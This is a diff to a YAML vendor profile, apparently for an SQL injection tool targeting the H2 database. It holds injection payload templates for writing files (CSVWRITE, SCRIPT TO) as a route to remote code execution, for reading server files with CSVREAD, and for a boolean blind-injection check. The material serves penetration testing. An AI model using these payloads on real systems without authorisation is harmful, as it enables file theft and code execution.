@@ -105,11 +105,16 @@ resource:
   # - RCE
     
   rce:
-   createTable: |
-    ; create table %s (c varchar(255))
-    ; insert into %s (c) values ('%s')
-   callCsvWrite: ; call csvwrite('%s', 'select * from %s')
-   scriptSimple: ; script simple to '%s' table %s
+    createTable: |
+      ; create table %s (c varchar(255))
+      ; insert into %s (c) values ('%s')
+    scriptSimple: ; script simple to '%s' table %s
+    # alternative method not used
+    callCsvWrite: ; call csvwrite('%s', 'select * from %s')
+  
+  file:
+    createTable: ; create table %s (c varchar(9999)) as select * from csvread('%s')
+    read: select group_concat(c separator '\n')||'%s' from %s
 
 strategy:
  configuration:
@@ -141,6 +146,7 @@ strategy:
     - h2 database
    orderByErrorMessage:
     - Order by expression "1337" must be in the result list in this case
+   vendorSpecific: case ${test} when true then space(5) else stringencode('a') end = space(5)
 
  union:
   indices: union select ${indices}
